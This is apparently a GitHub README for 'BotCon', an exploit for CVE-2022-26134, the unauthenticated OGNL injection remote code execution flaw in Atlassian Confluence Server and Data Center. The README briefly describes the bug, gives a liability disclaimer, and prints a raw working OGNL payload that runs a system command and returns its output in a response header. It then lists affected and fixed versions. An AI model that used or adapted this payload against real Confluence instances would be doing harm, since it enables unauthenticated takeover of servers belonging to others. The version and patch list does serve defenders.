# BotCon
Attlasian Confluence Un-Authenticated Remote Code Execution via OGNL Injection (CVE-2022-26134)

- On June 02, 2022 Atlassian released a security advisory for their Confluence Server and Data Center applications, highlighting a critical severity unauthenticated remote code execution vulnerability. The OGNL injection vulnerability allows an unauthenticated user to execute arbitrary code on a Confluence Server or Data Center instance.

## READ THIS !
Use with caution. You are responsible for your actions
Developers assume no liability and are not responsible for any misuse or damage.

![]()![BurpRequest](https://github.com/KeepWannabe/BotCon/blob/main/Screenshot%202022-06-11%20021342.png)

## RAW Payload

```${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}```

## Bug Details

- Affected Product : 
  - Confluence
    - Confluence Server
    - Confluence Data Center

- Affected Versions :
  - All supported versions of Confluence Server and Data Center are affected.
  - Confluence Server and Data Center versions after **1.3.0** are affected.

## Mitigations

- Update your Attlasian Confluence Version to these fixed version :
  - 7.4.17
  - 7.13.7
  - 7.14.3
  - 7.15.2
  - 7.16.4
  - 7.17.4
  - 7.18.1
